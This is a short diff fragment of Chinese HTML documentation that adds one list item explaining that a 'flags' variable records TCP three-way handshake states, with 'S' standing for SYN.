+<li>其中<code>flags</code>变量表示了<code>TCP</code>三次握手的不同状态，<code>S</code>表示<code>SYN</code>。</li>
 </ul>
 
       
